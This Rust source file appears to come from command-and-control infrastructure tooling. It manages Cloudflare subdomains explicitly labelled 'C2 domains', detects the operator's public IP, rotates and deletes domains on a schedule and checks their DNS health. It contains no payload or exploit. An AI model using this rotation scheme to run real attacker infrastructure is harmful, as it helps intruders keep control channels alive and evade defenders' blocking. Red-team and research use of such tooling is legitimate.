//! Domain management system with dynamic DNS and rotation capabilities

use crate::{InfraError, InfraResult, config::DomainConfig, CloudflareManager, generate_subdomain, validate_domain};
use chrono::{DateTime, Utc, Duration};
use hickory_resolver::{Resolver, config::*};
use log::{info, warn, debug, error};
use rand::Rng;
use std::collections::HashMap;
use std::net::IpAddr;
use std::str::FromStr;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::time::{sleep, Duration as TokioDuration, timeout};

/// Domain status information
#[derive(Debug, Clone, PartialEq)]
pub enum DomainStatus {
    Active,
    Inactive,
    Failed,
    Rotating,
    Unknown,
}

/// Domain health information
#[derive(Debug, Clone)]
pub struct DomainHealth {
    pub domain: String,
    pub status: DomainStatus,
    pub last_check: DateTime<Utc>,
    pub response_time_ms: Option<u64>,
    pub error_count: u32,
    pub success_count: u32,
    pub uptime_percentage: f64,
}

/// Active domain information
#[derive(Debug, Clone)]
pub struct ActiveDomain {
    pub subdomain: String,
    pub full_domain: String,
    pub ip_address: String,
    pub created_at: DateTime<Utc>,
    pub dns_record_id: Option<String>,
    pub health: DomainHealth,
}

/// Domain rotation schedule
#[derive(Debug, Clone)]
pub struct RotationSchedule {
    pub interval_hours: u64,
    pub next_rotation: DateTime<Utc>,
    pub max_concurrent_domains: u32,
    pub cleanup_old_domains: bool,
}

/// Domain manager for orchestrating DNS operations and rotation
pub struct DomainManager {
    config: DomainConfig,
    cloudflare: CloudflareManager,
    resolver: Arc<Resolver>,
    active_domains: Arc<RwLock<HashMap<String, ActiveDomain>>>,
    rotation_schedule: Arc<RwLock<RotationSchedule>>,
    domain_health: Arc<RwLock<HashMap<String, DomainHealth>>>,
    current_ip: Arc<RwLock<Option<String>>>,
}

impl DomainManager {
    /// Create a new domain manager
    pub async fn new(config: DomainConfig, cloudflare: CloudflareManager) -> InfraResult<Self> {
        info!("Initializing domain manager");
        
        let resolver = Resolver::new(ResolverConfig::default(), ResolverOpts::default())
            .map_err(|e| InfraError::DnsError(format!("Failed to create DNS resolver: {}", e)))?;
        
        let rotation_schedule = RotationSchedule {
            interval_hours: config.rotation_interval,
            next_rotation: Utc::now() + Duration::hours(config.rotation_interval as i64),
            max_concurrent_domains: config.max_subdomains,
            cleanup_old_domains: true,
        };
        
        Ok(Self {
            config,
            cloudflare,
            resolver: Arc::new(resolver),
            active_domains: Arc::new(RwLock::new(HashMap::new())),
            rotation_schedule: Arc::new(RwLock::new(rotation_schedule)),
            domain_health: Arc::new(RwLock::new(HashMap::new())),
            current_ip: Arc::new(RwLock::new(None)),
        })
    }
    
    /// Initialize the domain manager with current public IP
    pub async fn initialize(&self) -> InfraResult<()> {
        info!("Initializing domain manager");
        
        // Verify Cloudflare access
        let _zone = self.cloudflare.verify_access().await?;
        
        // Detect current public IP
        let public_ip = self.detect_public_ip().await?;
        *self.current_ip.write().await = Some(public_ip.clone());
        info!("Detected public IP: {}", public_ip);
        
        // Create initial domains if none exist
        self.ensure_minimum_domains().await?;
        
        info!("Domain manager initialized successfully");
        Ok(())
    }
    
    /// Detect the current public IP address
    async fn detect_public_ip(&self) -> InfraResult<String> {
        let services = vec![
            "https://api.ipify.org",
            "https://ifconfig.me/ip",
            "https://ipecho.net/plain",
            "https://myexternalip.com/raw",
        ];
        
        let client = reqwest::Client::new();
        
        for service in services {
            debug!("Trying IP detection service: {}", service);
            
            match timeout(TokioDuration::from_secs(10), client.get(service).send()).await {
                Ok(Ok(response)) => {
                    if response.status().is_success() {
                        if let Ok(ip_text) = response.text().await {
                            let ip_text = ip_text.trim();
                            if let Ok(ip_addr) = IpAddr::from_str(ip_text) {
                                info!("Detected public IP: {} (via {})", ip_addr, service);
                                return Ok(ip_addr.to_string());
                            }
                        }
                    }
                }
                Ok(Err(e)) => warn!("Service {} failed: {}", service, e),
                Err(_) => warn!("Service {} timed out", service),
            }
        }
        
        Err(InfraError::DnsError("Failed to detect public IP from all services".to_string()))
    }
    
    /// Ensure minimum number of active domains
    async fn ensure_minimum_domains(&self) -> InfraResult<()> {
        let active_count = self.active_domains.read().await.len() as u32;
        let min_domains = std::cmp::min(self.config.max_subdomains, 3); // At least 3 domains
        
        if active_count < min_domains {
            let needed = min_domains - active_count;
            info!("Creating {} additional domains to meet minimum requirement", needed);
            
            for _ in 0..needed {
                self.create_new_domain().await?;
            }
        }
        
        Ok(())
    }
    
    /// Create a new C2 domain
    pub async fn create_new_domain(&self) -> InfraResult<ActiveDomain> {
        let public_ip = self.current_ip.read().await
            .as_ref()
            .ok_or_else(|| InfraError::ConfigError("Public IP not detected".to_string()))?
            .clone();
        
        // Generate subdomain name
        let subdomain = self.generate_subdomain_name()?;
        let base_domain = self.cloudflare.config().domain.clone();
        let full_domain = format!("{}.{}", subdomain, base_domain);
        
        info!("Creating new C2 domain: {}", full_domain);
        
        // Create DNS record
        let dns_record = self.cloudflare.create_c2_subdomain(&subdomain, &public_ip).await?;
        
        // Create domain health tracker
        let health = DomainHealth {
            domain: full_domain.clone(),
            status: DomainStatus::Active,
            last_check: Utc::now(),
            response_time_ms: None,
            error_count: 0,
            success_count: 0,
            uptime_percentage: 100.0,
        };
        
        // Create active domain entry
        let active_domain = ActiveDomain {
            subdomain: subdomain.clone(),
            full_domain: full_domain.clone(),
            ip_address: public_ip,
            created_at: Utc::now(),
            dns_record_id: dns_record.id.clone(),
            health: health.clone(),
        };
        
        // Store in active domains
        self.active_domains.write().await.insert(subdomain.clone(), active_domain.clone());
        self.domain_health.write().await.insert(full_domain.clone(), health);
        
        info!("Successfully created domain: {} -> {}", full_domain, active_domain.ip_address);
        Ok(active_domain)
    }
    
    /// Generate a subdomain name based on configuration
    fn generate_subdomain_name(&self) -> InfraResult<String> {
        use crate::config::SubdomainPattern;
        
        match &self.config.subdomain_pattern {
            SubdomainPattern::Random { length } => {
                Ok(generate_subdomain(*length))
            }
            SubdomainPattern::Dictionary { wordlist } => {
                // TODO: Implement dictionary-based generation
                warn!("Dictionary pattern not implemented, falling back to random");
                Ok(generate_subdomain(8))
            }
            SubdomainPattern::Custom { template } => {
                // Replace placeholders in template
                let mut result = template.clone();
                result = result.replace("{random}", &generate_subdomain(6));
                result = result.replace("{timestamp}", &Utc::now().timestamp().to_string());
                
                // Validate the generated subdomain
                if validate_domain(&format!("{}.example.com", result)) {
                    Ok(result)
                } else {
                    warn!("Generated subdomain '{}' is invalid, falling back to random", result);
                    Ok(generate_subdomain(8))
                }
            }
        }
    }
    
    /// Update domain to point to new IP address
    pub async fn update_domain_ip(&self, subdomain: &str, new_ip: &str) -> InfraResult<()> {
        info!("Updating domain {} to point to {}", subdomain, new_ip);
        
        // Update DNS record
        let _updated_record = self.cloudflare.update_c2_subdomain(subdomain, new_ip).await?;
        
        // Update active domain entry
        if let Some(domain) = self.active_domains.write().await.get_mut(subdomain) {
            domain.ip_address = new_ip.to_string();
        }
        
        info!("Successfully updated domain: {}", subdomain);
        Ok(())
    }
    
    /// Perform domain rotation
    pub async fn rotate_domains(&self) -> InfraResult<Vec<ActiveDomain>> {
        info!("Performing domain rotation");
        
        let mut newly_created = Vec::new();
        let rotation_count = std::cmp::min(2, self.config.max_subdomains / 2); // Rotate up to half
        
        // Create new domains
        for _ in 0..rotation_count {
            match self.create_new_domain().await {
                Ok(domain) => newly_created.push(domain),
                Err(e) => warn!("Failed to create domain during rotation: {}", e),
            }
        }
        
        // Remove oldest domains if we exceed maximum
        self.cleanup_excess_domains().await?;
        
        // Update next rotation time
        {
            let mut schedule = self.rotation_schedule.write().await;
            schedule.next_rotation = Utc::now() + Duration::hours(schedule.interval_hours as i64);
        }
        
        info!("Domain rotation completed, created {} new domains", newly_created.len());
        Ok(newly_created)
    }
    
    /// Clean up excess domains
    async fn cleanup_excess_domains(&self) -> InfraResult<()> {
        let active_domains = self.active_domains.read().await;
        let excess_count = active_domains.len() as u32;
        
        if excess_count <= self.config.max_subdomains {
            return Ok(());
        }
        
        drop(active_domains); // Release read lock
        
        let domains_to_remove = excess_count - self.config.max_subdomains;
        info!("Cleaning up {} excess domains", domains_to_remove);
        
        // Find oldest domains to remove
        let mut domains: Vec<_> = self.active_domains.read().await
            .values()
            .cloned()
            .collect();
        
        domains.sort_by(|a, b| a.created_at.cmp(&b.created_at));
        
        let mut removed_count = 0;
        for domain in domains.iter().take(domains_to_remove as usize) {
            if let Err(e) = self.remove_domain(&domain.subdomain).await {
                warn!("Failed to remove domain {}: {}", domain.full_domain, e);
            } else {
                removed_count += 1;
            }
        }
        
        info!("Cleaned up {} domains", removed_count);
        Ok(())
    }
    
    /// Remove a domain and its DNS record
    pub async fn remove_domain(&self, subdomain: &str) -> InfraResult<()> {
        info!("Removing domain: {}", subdomain);
        
        // Get domain info before removing
        let domain = self.active_domains.read().await.get(subdomain).cloned();
        
        if let Some(domain) = domain {
            // Remove DNS record
            if let Some(record_id) = &domain.dns_record_id {
                if let Err(e) = self.cloudflare.delete_dns_record(record_id).await {
                    warn!("Failed to delete DNS record {}: {}", record_id, e);
                }
            }
            
            // Remove from active domains
            self.active_domains.write().await.remove(subdomain);
            self.domain_health.write().await.remove(&domain.full_domain);
            
            info!("Successfully removed domain: {}", domain.full_domain);
        } else {
            warn!("Domain {} not found in active domains", subdomain);
        }
        
        Ok(())
    }
    
    /// Check health of all active domains
    pub async fn check_domain_health(&self) -> InfraResult<Vec<DomainHealth>> {
        info!("Checking health of all active domains");
        
        let domains: Vec<_> = self.active_domains.read().await
            .values()
            .cloned()
            .collect();
        
        let mut health_results = Vec::new();
        
        for domain in domains {
            match self.check_single_domain_health(&domain.full_domain).await {
                Ok(health) => {
                    self.domain_health.write().await.insert(domain.full_domain.clone(), health.clone());
                    health_results.push(health);
                }
                Err(e) => {
                    warn!("Health check failed for {}: {}", domain.full_domain, e);
                    
                    // Update health with error
                    let mut health = domain.health.clone();
                    health.status = DomainStatus::Failed;
                    health.last_check = Utc::now();
                    health.error_count += 1;
                    
                    self.domain_health.write().await.insert(domain.full_domain.clone(), health.clone());
                    health_results.push(health);
                }
            }
        }
        
        info!("Health check completed for {} domains", health_results.len());
        Ok(health_results)
    }
    
    /// Check health of a single domain
    async fn check_single_domain_health(&self, domain: &str) -> InfraResult<DomainHealth> {
        let start_time = std::time::Instant::now();
        
        // Perform DNS lookup with timeout
        let resolver = self.resolver.clone();
        let domain_owned = domain.to_string(); // Clone to avoid lifetime issues
        let lookup_future = async move {
            // Spawn the blocking DNS lookup in a thread
            tokio::task::spawn_blocking(move || {
                resolver.lookup_ip(domain_owned)
            }).await
        };
        
        let lookup_result = timeout(
            TokioDuration::from_secs(self.config.dns_timeout),
            lookup_future
        ).await;
        
        let response_time_ms = start_time.elapsed().as_millis() as u64;
        
        let mut health = self.domain_health.read().await
            .get(domain)
            .cloned()
            .unwrap_or_else(|| DomainHealth {
                domain: domain.to_string(),
                status: DomainStatus::Unknown,
                last_check: Utc::now(),
                response_time_ms: None,
                error_count: 0,
                success_count: 0,
                uptime_percentage: 0.0,
            });
        
        health.last_check = Utc::now();
        health.response_time_ms = Some(response_time_ms);
        
        match lookup_result {
            Ok(Ok(Ok(_lookup))) => {
                health.status = DomainStatus::Active;
                health.success_count += 1;
            }
            Ok(Ok(Err(e))) => {
                health.status = DomainStatus::Failed;
                health.error_count += 1;
                return Err(InfraError::DnsError(format!("DNS lookup failed: {}", e)));
            }
            Ok(Err(_join_error)) => {
                health.status = DomainStatus::Failed;
                health.error_count += 1;
                return Err(InfraError::DnsError("DNS task join failed".to_string()));
            }
            Err(_) => {
                health.status = DomainStatus::Failed;
                health.error_count += 1;
                return Err(InfraError::DnsError("DNS lookup timeout".to_string()));
            }
        }
        
        // Calculate uptime percentage
        let total_checks = health.success_count + health.error_count;
        if total_checks > 0 {
            health.uptime_percentage = (health.success_count as f64 / total_checks as f64) * 100.0;
        }
        
        Ok(health)
    }
    
    /// Get list of active domains
    pub async fn get_active_domains(&self) -> Vec<ActiveDomain> {
        self.active_domains.read().await.values().cloned().collect()
    }
    
    /// Get domain health status
    pub async fn get_domain_health(&self) -> Vec<DomainHealth> {
        self.domain_health.read().await.values().cloned().collect()
    }
    
    /// Check if domain rotation is needed
    pub async fn needs_rotation(&self) -> bool {
        let schedule = self.rotation_schedule.read().await;
        Utc::now() >= schedule.next_rotation
    }
    
    /// Get next rotation time
    pub async fn get_next_rotation_time(&self) -> DateTime<Utc> {
        self.rotation_schedule.read().await.next_rotation
    }
    
    /// Get a random active domain for load balancing
    pub async fn get_random_active_domain(&self) -> Option<ActiveDomain> {
        let domains = self.active_domains.read().await;
        if domains.is_empty() {
            return None;
        }
        
        let domain_list: Vec<_> = domains.values().collect();
        let index = rand::thread_rng().gen_range(0..domain_list.len());
        Some(domain_list[index].clone())
    }
    
    /// Update current public IP and all domains
    pub async fn update_public_ip(&self, new_ip: &str) -> InfraResult<()> {
        info!("Updating all domains to new IP: {}", new_ip);
        
        let domains: Vec<_> = self.active_domains.read().await.keys().cloned().collect();
        
        for subdomain in domains {
            if let Err(e) = self.update_domain_ip(&subdomain, new_ip).await {
                warn!("Failed to update domain {}: {}", subdomain, e);
            }
        }
        
        *self.current_ip.write().await = Some(new_ip.to_string());
        info!("Updated {} domains to new IP", self.active_domains.read().await.len());
        
        Ok(())
    }
    
    /// Get configuration reference
    pub fn config(&self) -> &DomainConfig {
        &self.config
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{CloudflareConfig, config::SubdomainPattern};

    #[test]
    fn test_domain_health_creation() {
        let health = DomainHealth {
            domain: "test.example.com".to_string(),
            status: DomainStatus::Active,
            last_check: Utc::now(),
            response_time_ms: Some(150),
            error_count: 0,
            success_count: 5,
            uptime_percentage: 100.0,
        };
        
        assert_eq!(health.domain, "test.example.com");
        assert_eq!(health.status, DomainStatus::Active);
        assert_eq!(health.uptime_percentage, 100.0);
    }

    #[test]
    fn test_rotation_schedule() {
        let schedule = RotationSchedule {
            interval_hours: 24,
            next_rotation: Utc::now() + Duration::hours(24),
            max_concurrent_domains: 5,
            cleanup_old_domains: true,
        };
        
        assert_eq!(schedule.interval_hours, 24);
        assert_eq!(schedule.max_concurrent_domains, 5);
        assert!(schedule.cleanup_old_domains);
    }

    #[test]
    fn test_active_domain_creation() {
        let domain = ActiveDomain {
            subdomain: "test123".to_string(),
            full_domain: "test123.example.com".to_string(),
            ip_address: "192.168.1.1".to_string(),
            created_at: Utc::now(),
            dns_record_id: Some("record123".to_string()),
            health: DomainHealth {
                domain: "test123.example.com".to_string(),
                status: DomainStatus::Active,
                last_check: Utc::now(),
                response_time_ms: None,
                error_count: 0,
                success_count: 0,
                uptime_percentage: 100.0,
            },
        };
        
        assert_eq!(domain.subdomain, "test123");
        assert_eq!(domain.ip_address, "192.168.1.1");
        assert!(domain.dns_record_id.is_some());
    }
}
